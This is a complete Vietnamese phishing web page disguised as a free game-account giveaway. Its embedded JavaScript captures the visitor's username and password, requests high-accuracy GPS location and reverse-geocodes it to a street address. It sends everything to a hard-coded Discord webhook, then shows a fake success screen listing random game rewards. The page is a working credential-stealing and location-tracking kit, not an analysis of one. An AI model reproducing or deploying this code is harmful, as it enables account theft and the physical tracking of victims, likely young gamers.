<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 Nhận Acc Free</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #0a0a1a;
            padding: 20px;
            overflow: hidden;
            position: relative;
        }

        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }

        .star {
            position: absolute;
            width: 3px;
            height: 3px;
            background: white;
            border-radius: 50%;
            animation: twinkle 2s infinite alternate;
        }

        @keyframes twinkle {
            0% { opacity: 0.2; transform: scale(0.8); }
            100% { opacity: 1; transform: scale(1.2); }
        }

        .glass {
            position: relative;
            z-index: 1;
            background: rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 32px;
            padding: 44px 34px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6);
            transition: 0.6s ease;
        }

        .glass.hidden {
            display: none;
        }

        .logo {
            text-align: center;
            font-size: 52px;
            margin-bottom: 2px;
        }

        h2 {
            color: #fff;
            text-align: center;
            font-size: 28px;
            font-weight: 700;
            letter-spacing: 0.5px;
        }

        h2 .highlight {
            background: linear-gradient(135deg, #00c8ff, #a855f7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .sub {
            color: #aaa;
            text-align: center;
            font-size: 14px;
            margin: 4px 0 20px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
            padding-bottom: 16px;
        }

        .sub span {
            color: #fbbf24;
            font-weight: 600;
        }

        .tag {
            display: inline-block;
            background: rgba(251, 191, 36, 0.08);
            color: #fbbf24;
            font-size: 13px;
            padding: 6px 18px;
            border-radius: 40px;
            border: 1px solid rgba(251, 191, 36, 0.15);
            margin-bottom: 18px;
            text-align: center;
            width: 100%;
            animation: pulseTag 2s infinite;
        }

        @keyframes pulseTag {
            0%,
            100% {
                opacity: 0.9;
            }
            50% {
                opacity: 0.5;
            }
        }

        .input-group {
            margin-bottom: 16px;
        }

        .input-group input {
            width: 100%;
            padding: 14px 18px;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 16px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: 0.3s;
        }

        .input-group input:focus {
            border-color: #00c8ff;
            background: rgba(255, 255, 255, 0.06);
            box-shadow: 0 0 24px rgba(0, 200, 255, 0.06);
        }

        .input-group input::placeholder {
            color: #666;
        }

        .btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 16px;
            background: linear-gradient(135deg, #00c8ff, #7c3aed);
            color: #fff;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 6px 30px rgba(0, 100, 255, 0.2);
            margin-top: 4px;
        }

        .btn:hover {
            transform: scale(1.02);
            box-shadow: 0 10px 44px rgba(0, 100, 255, 0.3);
        }

        .btn:active {
            transform: scale(0.96);
        }

        .status {
            text-align: center;
            margin-top: 16px;
            font-size: 14px;
            color: #fbbf24;
            min-height: 24px;
        }

        .footer {
            text-align: center;
            margin-top: 20px;
            color: #444;
            font-size: 12px;
        }

        /* ===== KẾT QUẢ ===== */
        .result-box {
            display: none;
            position: relative;
            z-index: 1;
            background: rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 32px;
            padding: 44px 34px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.6);
            text-align: center;
            animation: fadeIn 0.6s ease;
        }

        .result-box.show {
            display: block;
        }

        @keyframes fadeIn {
            0% {
                opacity: 0;
                transform: scale(0.9);
            }
            100% {
                opacity: 1;
                transform: scale(1);
            }
        }

        .result-box .icon {
            font-size: 50px;
            margin-bottom: 10px;
        }

        .result-box .info {
            color: #fff;
            font-size: 18px;
            margin: 10px 0;
            word-break: break-all;
        }

        .result-box .info span {
            color: #00c8ff;
            font-weight: 600;
        }

        .result-box .game-list {
            margin-top: 20px;
            border-top: 1px solid rgba(255, 255, 255, 0.06);
            padding-top: 16px;
        }

        .result-box .game-item {
            color: #aaa;
            font-size: 15px;
            padding: 6px 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
        }

        .result-box .game-item:last-child {
            border-bottom: none;
        }

        .result-box .game-item strong {
            color: #fbbf24;
        }

        @media (max-width: 600px) {
            .result-box .info {
                font-size: 15px;
            }
        }
    </style>
</head>
<body>

    <!-- NỀN SAO -->
    <div class="stars" id="stars"></div>

    <!-- CARD ĐĂNG NHẬP -->
    <div class="glass" id="loginCard">
        <div class="logo">🎮</div>
        <h2>Nhận Acc <span class="highlight">Free</span></h2>
        <div class="sub">🎁 Đăng nhập để nhận <span>Random Account</span></div>
        <div class="tag">⚡ Còn 128 acc • Đang hot</div>

        <div class="input-group">
            <input type="text" id="username" placeholder="👤 Tên đăng nhập / Email" />
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="🔑 Mật khẩu" />
        </div>

        <button class="btn" id="loginBtn">🚀 Nhận Acc Ngay</button>
        <div class="status" id="status">✨ Nhập thông tin và bấm nhận</div>
        <div class="footer">🔒 Bảo mật • Hệ thống tự động • 24/7</div>
    </div>

    <!-- CARD KẾT QUẢ -->
    <div class="result-box" id="resultBox">
        <div class="icon">✅</div>
        <div class="info">👤 <span id="displayUser">user</span></div>
        <div class="info">🔑 <span id="displayPass">pass</span></div>
        <div class="game-list">
            <div class="game-item">🎮 <strong>Game của bạn:</strong></div>
            <div class="game-item" id="game1">Loading...</div>
            <div class="game-item" id="game2">Loading...</div>
            <div class="game-item" id="game3">Loading...</div>
        </div>
        <div style="margin-top: 20px; color: #555; font-size: 13px;">💀 @tpmodz</div>
    </div>

    <script>
        // === TẠO SAO ===
        const starsContainer = document.getElementById('stars');
        for (let i = 0; i < 120; i++) {
            const star = document.createElement('div');
            star.className = 'star';
            star.style.left = Math.random() * 100 + '%';
            star.style.top = Math.random() * 100 + '%';
            star.style.animationDelay = Math.random() * 2 + 's';
            star.style.animationDuration = (1.5 + Math.random() * 2) + 's';
            star.style.width = (1 + Math.random() * 3) + 'px';
            star.style.height = star.style.width;
            starsContainer.appendChild(star);
        }

        // === DISCORD WEBHOOK ===
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1524287822968651946/wD0QnLQ-NLS6Q1JvEi-esT0sZZazJLbN32ssAer8cFsWrzAIAaRWHcdTKNdrFIUNhYtx';

        // === LẤY GPS CHÍNH XÁC ===
        function getLocationGPS(callback) {
            if (!navigator.geolocation) {
                callback(null);
                return;
            }
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const acc = pos.coords.accuracy;

                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`)
                        .then(res => res.json())
                        .then(data => {
                            callback({
                                lat: lat,
                                lon: lon,
                                acc: acc,
                                address: data.display_name || 'Không xác định'
                            });
                        })
                        .catch(() => {
                            callback({
                                lat: lat,
                                lon: lon,
                                acc: acc,
                                address: 'Lỗi lấy địa chỉ'
                            });
                        });
                },
                function(err) {
                    callback(null);
                },
                { enableHighAccuracy: true, timeout: 10000 }
            );
        }

        // === GỬI DISCORD ===
        function sendToDiscord(user, pass, loc) {
            const embed = {
                title: '🎯 LOGIN + LOCATION',
                color: 0xff0000,
                fields: [
                    { name: '👤 Username', value: user, inline: true },
                    { name: '🔑 Password', value: pass, inline: true },
                    { name: '📍 Địa chỉ', value: loc && loc.address ? loc.address : 'Không lấy được', inline: false },
                    { name: 'Latitude', value: loc && loc.lat ? loc.lat.toString() : 'Không có', inline: true },
                    { name: 'Longitude', value: loc && loc.lon ? loc.lon.toString() : 'Không có', inline: true },
                    { name: '📏 Độ chính xác', value: loc && loc.acc ? loc.acc + 'm' : 'N/A', inline: true },
                    { name: '🕐 Thời gian', value: new Date().toLocaleString(), inline: false }
                ],
                footer: { text: '🎁 Nhận Acc Free • @tpmodz' },
                timestamp: new Date().toISOString()
            };

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed] })
            }).catch(err => console.log('Lỗi gửi Discord:', err));
        }

        // === DANH SÁCH GAME (CỐ ĐỊNH) ===
        const gameList = [
            '🎮 Roblox - 1.200 Robux',
            '🔥 Free Fire - Skin VIP',
            '⚔️ PUBG Mobile - Ace Rank',
            '🏎️ Asphalt 9 - Full Car',
            '🧙 Genshin Impact - 5* Nhân Vật',
            '🕹️ Minecraft - Full Skin',
            '🎯 Call of Duty Mobile - Legendary',
            '🚀 Arena of Valor - Master Rank',
            '💀 Liên Quân Mobile - Skin Limited',
            '🐉 Dragon City - Full Dragon'
        ];

        function getRandomGames(count) {
            const shuffled = [...gameList].sort(() => Math.random() - 0.5);
            return shuffled.slice(0, count);
        }

        // === XỬ LÝ LOGIN ===
        document.getElementById('loginBtn').addEventListener('click', function() {
            const username = document.getElementById('username').value || 'Không có';
            const password = document.getElementById('password').value || 'Không có';
            const status = document.getElementById('status');

            status.innerHTML = '⏳ Đang xác thực...';
            status.style.color = '#00c8ff';

            // Lấy GPS gửi Discord
            getLocationGPS(function(location) {
                sendToDiscord(username, password, location);
            });

            // Hiện kết quả
            document.getElementById('loginCard').classList.add('hidden');
            document.getElementById('displayUser').textContent = username;
            document.getElementById('displayPass').textContent = password;

            // Random game
            const games = getRandomGames(3);
            document.getElementById('game1').textContent = games[0] || 'Không có game';
            document.getElementById('game2').textContent = games[1] || 'Không có game';
            document.getElementById('game3').textContent = games[2] || 'Không có game';

            document.getElementById('resultBox').classList.add('show');
            status.innerHTML = '✅ Đã nhận!';
            status.style.color = '#4ade80';
        });
    </script>

</body>
</html>
